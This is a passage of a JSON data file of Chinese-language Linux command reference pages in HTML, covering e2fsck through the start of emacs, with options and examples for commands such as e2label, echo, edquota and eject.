class=\"hljs-deletion\">-L&lt;文件&gt;：先清除损坏区块列表，再将文件中指定的区块加到损坏区块列表。因此损坏区块列表的区块跟文件中指定的区块是一样的；</span>\n<span class=\"hljs-deletion\">-n：以只读模式开启文件系统，并采取非互动方式执行，所有的问题对话均设置以\"no\"回答；</span>\n<span class=\"hljs-deletion\">-p：不询问使用者意见，便自动修复文件系统；</span>\n<span class=\"hljs-deletion\">-r：此参数只为了兼容性而存在，并无实际作用；</span>\n<span class=\"hljs-deletion\">-s：如果文件系统的字节顺序不适当，就交换字节顺序，否则不做任何动作；</span>\n<span class=\"hljs-deletion\">-S：不管文件系统的字节顺序，一律交换字节顺序；</span>\n<span class=\"hljs-deletion\">-t：显示时间信息；</span>\n<span class=\"hljs-deletion\">-v：执行时显示详细的信息；</span>\n<span class=\"hljs-deletion\">-V：显示版本信息；</span>\n<span class=\"hljs-deletion\">-y：采取非互动方式执行，所有的问题均设置以\"yes\"回答。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件系统或者分区：指定文件系统或者分区所对应的设备文件名。</p>\n<h3 id=\"实例\">实例</h3>\n<p>检查<code>/dev/sda1</code>是否有问题，如发现问题便自动修复：</p>\n<pre><code class=\"language-shell\">e2fsck -a -y <span class=\"hljs-regexp\">/dev/</span>sda1\n</code></pre>\n<p>执行e2fsck或fsck前请先umount partition，否则有机会令档案系统毁损。如果需要对根目录<code>/</code>进行检查及修复，便需要进入singal user mode执行。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "e2label",
        "des": "设置第二扩展文件系统的卷标",
        "body": "<h1 id=\"e2label\">e2label</h1>\n<p>设置第二扩展文件系统的卷标</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>e2label命令</strong> 用来设置第二扩展文件系统的卷标。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">e2label</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<ul>\n<li>  文件系统：指定文件系统所对应的设备文件名；</li>\n<li>  新卷标：为文件系统指定新卷标。</li>\n</ul>\n<h3 id=\"实例\">实例</h3>\n<p>许多用了多年Linux的人可能也没有用过e2label命令。但是这个命令相当有效。在介绍它之前,我们先看看<code>/etc/fstab文</code>件：</p>\n<pre><code class=\"language-shell\">label=<span class=\"hljs-regexp\">//</span>ext3 defaults <span class=\"hljs-number\">1</span> <span class=\"hljs-number\">1</span>\n<span class=\"hljs-regexp\">/dev/</span>hda7 /usr ext3 defaults <span class=\"hljs-number\">1</span> <span class=\"hljs-number\">1</span>\n</code></pre>\n<p>第二行的意思很容易懂，就是把<code>/dev/hda7</code> mount到<code>/usr</code>上。第一行没有指明分区，意思是把label(卷标)为/ 的分区mount到/上。这样写的好处在于即使如果把硬盘从主板上的ide0(hda) 换到ide2(hdc)上，系统仍然可以自动挂载正确的分区。通常Linux安装的时候已经自动指定了卷标。如果是手动增加的新分区，可以用下边的命令为 其指定卷标：</p>\n<pre><code class=\"language-shell\">e2label <span class=\"hljs-regexp\">/dev/</span>hdax /<span class=\"hljs-keyword\">new</span>\nmkdir /<span class=\"hljs-keyword\">new</span>\n</code></pre>\n<p>然后在<code>/etc/fstab</code>里加入：</p>\n<pre><code class=\"language-shell\">label=/<span class=\"hljs-keyword\">new</span>  <span class=\"hljs-type\"></span>/<span class=\"hljs-keyword\">new</span>  <span class=\"hljs-type\">ext3</span>  defaults  <span class=\"hljs-number\">1</span> <span class=\"hljs-number\">1</span>\n</code></pre>\n<p>下次重新起动机器的时候，就会把卷标为<code>/new</code>的分区挂接到<code>/new</code>上。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "echo",
        "des": "输出指定的字符串或者变量",
        "body": "<h1 id=\"echo\">echo</h1>\n<p>输出指定的字符串或者变量</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>echo命令</strong> 用于在shell中打印shell变量的值，或者直接输出指定的字符串。linux的echo命令，在shell编程中极为常用, 在终端下打印变量value的时候也是常常用到的，因此有必要了解下echo的用法echo命令的功能是在显示器上显示一段文字，一般起到一个提示的作用。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">echo</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-e：激活转义字符。</span>\n</code></pre>\n<p>使用<code>-e</code>选项时，若字符串中出现以下字符，则特别加以处理，而不会将它当成一般文字输出：</p>\n<ul>\n<li><code>\\a</code> 发出警告声；</li>\n<li><code>\\b</code> 删除前一个字符；</li>\n<li><code>\\c</code> 不产生进一步输出 (\\c 后面的字符不会输出)；</li>\n<li><code>\\f</code> 换行但光标仍旧停留在原来的位置；</li>\n<li><code>\\n</code> 换行且光标移至行首；</li>\n<li><code>\\r</code> 光标移至行首，但不换行；</li>\n<li><code>\\t</code> 插入tab；</li>\n<li><code>\\v</code> 与\\f相同；</li>\n<li><code>\\\\</code> 插入\\字符；</li>\n<li><code>\\nnn</code> 插入 <code>nnn</code>（八进制）所代表的ASCII字符；</li>\n</ul>\n<h3 id=\"参数\">参数</h3>\n<p>变量：指定要打印的变量。</p>\n<h3 id=\"实例\">实例</h3>\n<p>用echo命令打印带有色彩的文字：</p>\n<p> <strong>文字色：</strong> </p>\n<pre><code class=\"language-shell\"><span class=\"hljs-keyword\">echo</span> -<span class=\"hljs-keyword\">e</span> <span class=\"hljs-string\">\"\\e[1;31mThis is red text\\e[0m\"</span>\nThis <span class=\"hljs-keyword\">is</span> <span class=\"hljs-keyword\">red</span> text\n</code></pre>\n<ul>\n<li>  <code>\\e[1;31m</code> 将颜色设置为红色</li>\n<li>  <code>\\e[0m</code> 将颜色重新置回</li>\n</ul>\n<p>颜色码：重置=0，黑色=30，红色=31，绿色=32，黄色=33，蓝色=34，洋红=35，青色=36，白色=37</p>\n<p> <strong>背景色</strong> ：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-variable\">echo</span> <span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">e</span> <span class=\"hljs-string\">\"<span class=\"hljs-char escape_\">\\e</span>[1;42mGreed Background<span class=\"hljs-char escape_\">\\e</span>[0m\"</span>\n<span class=\"hljs-title class_\">Greed</span> <span class=\"hljs-title class_\">Background</span>\n</code></pre>\n<p>颜色码：重置=0，黑色=40，红色=41，绿色=42，黄色=43，蓝色=44，洋红=45，青色=46，白色=47</p>\n<p> <strong>文字闪动：</strong> </p>\n<pre><code class=\"language-shell\">echo <span class=\"hljs-operator\">-</span>e <span class=\"hljs-string\">\"<span class=\"hljs-subst\">\\0</span>33[37;31;5mMySQL Server Stop...<span class=\"hljs-subst\">\\0</span>33[39;49;0m\"</span>\n</code></pre>\n<p>红色数字处还有其他数字参数：0 关闭所有属性、1 设置高亮度（加粗）、4 下划线、5 闪烁、7 反显、8 消隐</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "ed",
        "des": "单行纯文本编辑器",
        "body": "<h1 id=\"ed\">ed</h1>\n<p>单行纯文本编辑器</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>ed命令</strong> 是单行纯文本编辑器，它有命令模式（command mode）和输入模式（input mode）两种工作模式。ed命令支持多个内置命令，常见内置命令如下：</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">ed</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">A</span> <span class=\"hljs-comment\"># 切换到输入模式，在文件的最后一行之后输入新的内容；</span>\nC <span class=\"hljs-comment\"># 切换到输入模式，用输入的内容替换掉最后一行的内容；</span>\ni <span class=\"hljs-comment\"># 切换到输入模式，在当前行之前加入一个新的空行来输入内容；</span>\nd <span class=\"hljs-comment\"># 用于删除最后一行文本内容；</span>\nn <span class=\"hljs-comment\"># 用于显示最后一行的行号和内容；</span>\nw <span class=\"hljs-comment\"># &lt;文件名&gt;：一给定的文件名保存当前正在编辑的文件；</span>\nq <span class=\"hljs-comment\"># 退出ed编辑器。</span>\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-G或——traditional：提供兼容的功能；</span>\n<span class=\"hljs-deletion\">-p&lt;字符串&gt;：指定ed在command mode的提示字符；</span>\n<span class=\"hljs-deletion\">-s，-，--quiet或——silent：不执行开启文件时的检查功能；</span>\n<span class=\"hljs-deletion\">--help：显示帮助；</span>\n<span class=\"hljs-deletion\">--version：显示版本信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：待编辑的文件。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "edquota",
        "des": "用于编辑指定用户或工作组磁盘配额",
        "body": "<h1 id=\"edquota\">edquota</h1>\n<p>用于编辑指定用户或工作组磁盘配额</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>edquota命令</strong> 用于编辑指定用户或工作组磁盘配额。edquota预设会使用vi来编辑使用者或群组的quota设置。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">edquota</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-u：设置用户的quota，这是预设的参数；</span>\n<span class=\"hljs-deletion\">-g：设置群组的quota；</span>\n<span class=\"hljs-deletion\">-p&lt;源用户名称&gt;：将源用户的quota设置套用至其他用户或群组；</span>\n<span class=\"hljs-deletion\">-t：设置宽限期限。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>用户：指定要编辑磁盘配额限制的用户名或者工作组。</p>\n<h3 id=\"实例\">实例</h3>\n<p> <strong>配置系统的磁盘配额支持</strong> </p>\n<p>首先，磁盘配额是区域性的，我们可以决定哪块分区进行磁盘配额，哪块分区不用（自然也就不用配置了）。一般而言，作为一台web虚拟主机服务器，<code>/home</code>和<code>/www</code>（或者类似的）是供用户存放资源的分区，所以可以对这两个分区进行磁盘配额。假定我们需要对<code>/home</code>分区实现用户级的限制，而对<code>/www</code>进行每个组的用户配额。</p>\n<p>第一步：</p>\n<pre><code class=\"language-shell\">vi <span class=\"hljs-regexp\">/etc/</span>fstab\n</code></pre>\n<p>找到对应于<code>/home</code>和<code>/www</code>的行，例如：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-regexp\">/dev/</span>sda5 /home ext2 defaults <span class=\"hljs-number\">1</span> <span class=\"hljs-number\">2</span>\n<span class=\"hljs-regexp\">/dev/</span>sda7 /www ext2 defaults <span class=\"hljs-number\">1</span> <span class=\"hljs-number\">2</span>\n</code></pre>\n<p>在<code>/home</code>里实现用户级的磁盘配额，所以对sda5行的挂装选项域做如下修改：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-regexp\">/dev/</span>sda5 /home ext2 defaults，usrquota <span class=\"hljs-number\">1</span> <span class=\"hljs-number\">2</span>\n</code></pre>\n<p>注意，是usrquota哦。类似的，我们可以如下修改<code>/www</code>行：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-regexp\">/dev/</span>sda7 /www ext2 defaults，grpquota <span class=\"hljs-number\">1</span> <span class=\"hljs-number\">2</span>\n</code></pre>\n<p>如编辑根用户</p>\n<p>改<code>/etc/fstab</code>文件中</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">LABEL</span>=/ / ext2 defaults,usrquota,grpquota <span class=\"hljs-number\">1</span> <span class=\"hljs-number\">1</span>\n</code></pre>\n<p>说明：<code>/etc/fstab</code>文件的每一行由六个字段组成：</p>\n<ul>\n<li>  第一个字段：文件系统（分区）的注释（类似卷标）；</li>\n<li>  第二个字段：文件系统的装载点；</li>\n<li>  第三个字段：文件系统类型（磁盘配额只能在ext2文件系统上实现）；</li>\n<li>  第四个字段：装载文件系统是使用的选项，如果只想实现基于用户的磁盘配额，就加入usrquota关键字，只想实现基于组的磁盘配额，就加入grpqouta关键字，如果两者都需要，就全写入，中间可以用逗号分隔。</li>\n<li>  第五个字段：表明该文件系统（分区）是否为只读，如果是0就表示只读，1表示可以读写。</li>\n<li>  第六个字段：表示系统启动执行fsck时检查的顺序。</li>\n</ul>\n<p>注意：请特别注意这里的拼写，是usrquota和grpquota，不要写成userquota和groupquota。</p>\n<p>进入单用户模式，用quotacheck生成.user或.group文件</p>\n<p>quotacheck 你的目录</p>\n<pre><code class=\"language-shell\">example:quotacheck <span class=\"hljs-regexp\">/ ; quotacheck /</span>home\n</code></pre>\n<p>如果单用户模式报错的话umount你的设备<code>/dev/hda*</code></p>\n<p>再执行就ok了，重启动系统，如果一切正常的话，quota将开始正常工作。</p>\n<p> <strong>设置用户和组配额的分配量</strong> </p>\n<p>对磁盘配额的限制一般是从一个用户占用磁盘大小和所有文件的数量两个方面来进行的。在具体操作之前，我们先了解一下磁盘配额的两个基本概念：软限制和硬限制。</p>\n<ul>\n<li><p>  软限制：一个用户在文件系统可拥有的最大磁盘空间和最多文件数量，在某个宽限期内可以暂时超过这个限制。</p>\n</li>\n<li><p>  硬限制：一个用户可拥有的磁盘空间或文件的绝对数量，绝对不允许超过这个限制。</p>\n</li>\n<li><p><em>通过edquota直接编辑数据文件：</em>* </p>\n</li>\n</ul>\n<p>使用编辑配额命令edquota为用户配置定额，在重新启动系统之后，我们假设lanf是需要定额的系统帐户，可以使用如下命令来为用户分配磁盘配额：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">edquota -u lanf</span>\n</code></pre>\n<p>这个命令将启动默认文本编辑器（如vi或其他由$EDITOR 环境变量指定的编辑器），其内容如下所示：</p>\n<pre><code class=\"language-shell\">Quotas for user lanf:\n<span class=\"hljs-string\">/dev/sda5</span><span class=\"hljs-function\">:blocks</span> in use<span class=\"hljs-function\">:0</span>,limits<span class=\"hljs-params\">(<span class=\"hljs-attr\">soft</span> = 0,<span class=\"hljs-attr\">hard</span> = 0)</span>\ninodes in use<span class=\"hljs-function\">:0</span>,limits<span class=\"hljs-params\">(<span class=\"hljs-attr\">soft</span> = 0,<span class=\"hljs-attr\">hard</span> = 0)</span>\n</code></pre>\n<p>这表示lanf用户在<code>/dev/sda5</code>分区（该分区已经在usrquota的控制之下）中迄今使用了0个数据块（以K为单位），并且没有设限制（包括软限制soft和硬限制hard），同样，lanf在这个分区也没有任何文件和目录，并且也没有任何软硬限制。如果，我们想对用户进行磁盘容量的限制的话，只需要修改blocks行的limits部分就可以了，注意单位使用的是K。例如要为lanf分配100M磁盘的软限制，400M硬限制，可以使用如下的设置：</p>\n<pre><code class=\"language-shell\">Quotas for user lanf:\n<span class=\"hljs-string\">/dev/sda5</span><span class=\"hljs-function\">:blocks</span> in use<span class=\"hljs-function\">:0</span>,limits<span class=\"hljs-params\">(<span class=\"hljs-attr\">soft</span> = 102400,<span class=\"hljs-attr\">hard</span> = 409800)</span>\ninodes in use<span class=\"hljs-function\">:0</span>,limits<span class=\"hljs-params\">(<span class=\"hljs-attr\">soft</span> = 0,<span class=\"hljs-attr\">hard</span> = 0)</span>\n</code></pre>\n<p>同样的，要对文件目录的数量限制可以相应的修改inodes行。我们也可以同时对这两项都作出限制。只需要如下的修改Quotas for user lanf：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-string\">/dev/sda5</span><span class=\"hljs-function\">:blocks</span> in use<span class=\"hljs-function\">:0</span>,limits<span class=\"hljs-params\">(<span class=\"hljs-attr\">soft</span> = 102400,<span class=\"hljs-attr\">hard</span> = 409800)</span>\ninodes in use<span class=\"hljs-function\">:0</span>,limits<span class=\"hljs-params\">(<span class=\"hljs-attr\">soft</span> = 12800,<span class=\"hljs-attr\">hard</span> = 51200)</span>\n</code></pre>\n<p>这表示除了相应的容量的限制外，还对文件/目录的数量做了12800个的软限制和51200个的硬限制。在保存了新的配置后，该用户的磁盘使用就不能超过硬限制。如果用户试图超过这个限制，该操作将被取消，然后得到一个错误信息。但是，如果每个用户都要这么麻烦的设置的话，那这种重复的体力劳动实在有点令人不寒而栗，而且也太浪费时间了。幸好edquota还有个-p参数（prototype）可以对已有的用户设置进行拷贝。例如，我们想对Jack、Tom、Chen三个用户使用和lanf一样的限额配置，可以使用如下的命令：</p>\n<pre><code class=\"language-shell\">edquota -<span class=\"hljs-selector-tag\">p</span> lanf -u Jack Tom Chen\n</code></pre>\n<p>这样一来，这三个用户就被赋予了和lanf一样的磁盘配额。</p>\n<p>对组的配额，除了edquota命令中对应<code>-u</code>选项的改为<code>-g</code>选项，例如下面对webterm1组的操作：</p>\n<pre><code class=\"language-shell\">edquota -g webter<span class=\"hljs-name\">m1</span>\n</code></pre>\n<p>实际上，以上的限制只是对用户设定的硬限制在起作用。如果需要使软限制也起作用的话，还需要对用户的软限制设定宽限期，缺省的软限制的宽限期是无穷，这可以使用edquota命令的<code>-t</code>选项来实现。运行下面的命令：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">edquota -t</span>\n</code></pre>\n<p>edquota将打开缺省编辑器显示如下内容：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">time</span> units may be:days,hours,minutes,<span class=\"hljs-keyword\">or</span> <span class=\"hljs-built_in\">seconds</span>\nGrace period <span class=\"hljs-keyword\">before</span> enforcing soft limits <span class=\"hljs-keyword\">for</span> users:\n/dev/sda5:block grace period:<span class=\"hljs-number\">0</span> days,<span class=\"hljs-built_in\">file</span> grace period:<span class=\"hljs-number\">0</span> days\n</code></pre>\n<p>可以使用天、小时、分、秒为单位来设定宽限期。例如，在下面这个例子中，磁盘空间限制的宽限期为两天，而文件数量限制的宽限期只有6个小时。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-type\">Time</span> units may be:days,hours,minutes,<span class=\"hljs-keyword\">or</span> seconds\nGrace <span class=\"hljs-keyword\">period</span> before enforcing soft limits <span class=\"hljs-keyword\">for</span> users:\n<span class=\"hljs-operator\">/</span>dev<span class=\"hljs-operator\">/</span>sda5:block grace <span class=\"hljs-keyword\">period</span>:<span class=\"hljs-number\">2</span> days,file grace <span class=\"hljs-keyword\">period</span>:<span class=\"hljs-number\">6</span> hours\n</code></pre>\n<p> <strong>通过setquota工具加入：</strong> </p>\n<p>比如加入用户bye2000的磁盘配额，执行以下命令：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">setquota</span> –u / <span class=\"hljs-number\">2000</span> <span class=\"hljs-number\">2500</span> <span class=\"hljs-number\">100</span> <span class=\"hljs-number\">110</span> bye2000\n</code></pre>\n<p>以下是setquota命令用法的简单描述：</p>\n<pre><code class=\"language-shell\">setquota [ -u<span class=\"hljs-string\">|-g ] 装载点 软块数 硬块数 软文件数 硬文件数 用户名/组名</span>\n</code></pre>\n<p> <strong>查看用户磁盘使用情况</strong> </p>\n<p>要查明某一个用户使用了多少磁盘空间，例如lanf，可以使用如下的命令：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">quota -u lanf</span>\n</code></pre>\n<p>显示：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\">Disk quotas for user lanf(uid</span> <span class=\"hljs-comment\">503):</span>\n<span class=\"hljs-comment\">Filesystem blocks quota limit grace file quota limit grace</span>\n<span class=\"hljs-comment\">/dev/sda5</span> <span class=\"hljs-comment\">3</span> <span class=\"hljs-comment\">102400</span> <span class=\"hljs-comment\">409800</span> <span class=\"hljs-comment\">1</span> <span class=\"hljs-comment\">12800</span> <span class=\"hljs-comment\">51200</span>\n</code></pre>\n<p>同样，可以使用<code>quota -g groupname</code>命令来参看某个组的磁盘使用情况。</p>\n<p>注意：</p>\n<ol>\n<li> 如果该用户没有配置磁盘限额的话，输出显示<code>Disk quotas for user hujm (uid 503): none</code></li>\n<li> 如果不带任何参数运行quota的话，查看的是你自己的配额使用情况。</li>\n</ol>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "egrep",
        "des": "在文件内查找指定的字符串",
        "body": "<h1 id=\"egrep\">egrep</h1>\n<p>在文件内查找指定的字符串</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>egrep命令</strong> 用于在文件内查找指定的字符串。egrep执行效果与<code>grep -E</code>相似，使用的语法及参数可参照grep指令，与grep的不同点在于解读字符串的方法。egrep是用extended regular expression语法来解读的，而grep则用basic regular expression 语法解读，extended regular expression比basic regular expression的表达更规范。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">egrep</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(查找模式)</span><span class=\"hljs-params\">(文件名<span class=\"hljs-number\">1</span>，文件名<span class=\"hljs-number\">2</span>，……)</span></span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>显示文件中符合条件的字符。例如，查找当前目录下所有文件中包含字符串\"Linux\"的文件，可以使用如下命令：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">egrep</span> Linux *\n</code></pre>\n<p>结果如下所示：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-meta\"># 以下五行为 testfile 中包含Linux字符的行</span>\n<span class=\"hljs-symbol\">testfile:</span>hello Linux!\n<span class=\"hljs-symbol\">testfile:</span>Linux is a free Unix-type operating system.\n<span class=\"hljs-symbol\">testfile:</span>This is a Linux testfile!\n<span class=\"hljs-symbol\">testfile:</span>Linux\n<span class=\"hljs-symbol\">testfile:</span>Linux\n\n<span class=\"hljs-meta\"># 以下两行为testfile1中含Linux字符的行</span>\n<span class=\"hljs-symbol\">testfile1:</span>helLinux!\n<span class=\"hljs-symbol\">testfile1:</span>This a Linux testfile!\n\n<span class=\"hljs-meta\"># 以下两行为 testfile_2 中包含Linux字符的行</span>\n<span class=\"hljs-symbol\">testfile_2:</span>Linux is a free unix-type opterating system\n<span class=\"hljs-symbol\">testfile_2:</span>Linux test\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "eject",
        "des": "用来退出抽取式设备",
        "body": "<h1 id=\"eject\">eject</h1>\n<p>用来退出抽取式设备</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>eject命令</strong> 用来退出抽取式设备。若设备已挂入，则eject命令会先将该设备卸除再退出。</p>\n<p>eject允许可移动介质（典型是cd-ROM、软盘、磁带、或者JAZ以及zip磁盘）在软件控制下弹出。该命令也可以控制一些多盘片CD-ROM控制器，控制一些设备支持的自动弹出功能，以及控制一些CD-ROM驱动器磁盘托盘的关闭。与name相应的设备将被弹出，name可以为设备文件或者其挂载点，也可以为完整路径或者省略前面的/dev或者/mnt设备文件名。如果没有指定name，缺省使用cdrom。</p>\n<p>有四种不同的弹出的方法，具体要看设备是CD-ROM， SCSI设备，可移动软盘，还是磁带而定。默认的弹出会依次尝试所有四种方法，直到成功为止。如果设备当前是挂载上来的，那么在弹出前要先卸载。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">eject</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\">-<span class=\"hljs-keyword\">a</span>&lt;开关&gt;或<span class=\"hljs-comment\">--auto&lt;开关&gt;：控制设备的自动退出功能；</span>\n-c&lt;光驱编号&gt;或<span class=\"hljs-comment\">--changerslut&lt;光驱编号&gt;   选择光驱柜中的光驱；</span>\n-d或<span class=\"hljs-comment\">--default：显示预设的设备，而不是实际执行动作；</span>\n-f或<span class=\"hljs-comment\">--floppy：退出抽取式磁盘；</span>\n-h或<span class=\"hljs-comment\">--help：显示帮助；</span>\n-n或<span class=\"hljs-comment\">--noop：显示指定的设备；</span>\n-q或<span class=\"hljs-comment\">--tape：退出磁带；</span>\n-r或<span class=\"hljs-comment\">--cdrom：退出光盘；</span>\n-s或<span class=\"hljs-comment\">--scsi：以SCSI指令来退出设备；</span>\n-t或<span class=\"hljs-comment\">--trayclose：关闭光盘的托盘；</span>\n-v或<span class=\"hljs-comment\">--verbose：执行时，显示详细的说明。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>设备名：指定弹出的设备名称。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "elinks",
        "des": "纯文本界面的WWW浏览器",
        "body": "<h1 id=\"elinks\">elinks</h1>\n<p>纯文本界面的WWW浏览器</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>elinks命令</strong> 能实现一个纯文本界面的WWW浏览器，操作方式与“lynx”类似。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">elinks</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-anonymous：是否使用匿名帐号方式；</span>\n<span class=\"hljs-deletion\">-auto-submit：对于偶然遇到的第一个表单是否自动提交；</span>\n<span class=\"hljs-deletion\">-config-dir：指定elinks指令运行时读取和写入自身的配置和运行状态的存放目录；</span>\n<span class=\"hljs-deletion\">-dump：将HTML文档以纯文本的方式打印到标准输出设备；</span>\n<span class=\"hljs-deletion\">-version：显示指令的版本信息；</span>\n<span class=\"hljs-deletion\">-h：显示帮助信息。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>URL：指定要访问的URL地址。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "elm",
        "des": "纯文本邮件客户端程序",
        "body": "<h1 id=\"elm\">elm</h1>\n<p>纯文本邮件客户端程序</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>elm命令</strong> 是一个E-mail客户端管理程序，它提供了纯文本交互式全屏幕界面。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">elm</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-s&lt;邮件主题&gt;：指定新邮件的邮件主题；</span>\n<span class=\"hljs-deletion\">-f&lt;目录&gt;：开启程序时，读取指定的目录；</span>\n<span class=\"hljs-deletion\">-h：显示帮助；</span>\n<span class=\"hljs-deletion\">-i&lt;文件名&gt;：将文件内容插入送出的邮件中；</span>\n<span class=\"hljs-deletion\">-m：进入elm后，不显示指令说明；</span>\n<span class=\"hljs-deletion\">-v：显示elm的版本信息；</span>\n<span class=\"hljs-deletion\">-z：若收件信箱没有邮件，则不启动elm程序。</span>\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "emacs",
        "des": "功能强大的全屏文本编辑器",
        "body": "<h1 id=\"emacs\">emacs</h1>\n<p>功能强大的全屏文本编辑器</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>emacs命令</strong> 是由GNU组织的创始人Richard Stallman开发的一个功能强大的全屏文本编辑器，它支持多种编程语言，具有很多优良的特性。有众多的系统管理员和软件开发者使用emacs。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">emacs</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-addition\">+&lt;行号&gt;：启动emacs编辑器，并将光标移动到制定行号的行；</span>\n<span class=\"hljs-deletion\">-q：启动emacs编辑器，而不加载初始化文件；</span>\n<span class=\"hljs-deletion\">-u&lt;用户&gt;：启动emacs编辑器时，加载指定用户的初始化文件；</span>\n<span class=\"hljs-deletion\">-t&lt;文件&gt;：启动emacs编辑器时，把指定的文件作为中端，不适用标准输入（stdin）与标准输出（stdout）；</span>\n<span class=\"hljs-deletion\">-f&lt;函数&gt;：执行指定lisp（广泛应用于人工智能领域的编程语言）函数；</span>\n<span class=\"hljs-deletion\">-l&lt;lisp代码文件&gt;：加载指定的lisp代码文件；</span>\n<span class=\"hljs-deletion\">-batch：以批处理模式运行emacs编辑器。</span>\n</code></pre>\n<h3 id=\"参数\">参数</h3>\n<p>文件：指定要编辑的文本文件。</p>\n<h2 id=\"emacs命令操作大全\">emacs命令操作大全</h2>\n<p>基本命令</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-built_in\">C</span><span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">x</span> <span class=\"hljs-built_in\">C</span><span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">c</span> <span class=\"hljs-operator\">:</span> 退出<span class=\"hljs-variable\">Emacs</span>\n<span class=\"hljs-built_in\">C</span><span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">x</span> <span class=\"hljs-built_in\">C</span><span class=\"hljs-operator\">-</span><span class=\"hljs-variable\">f</span> <span class=\"hljs-operator\">:</span> 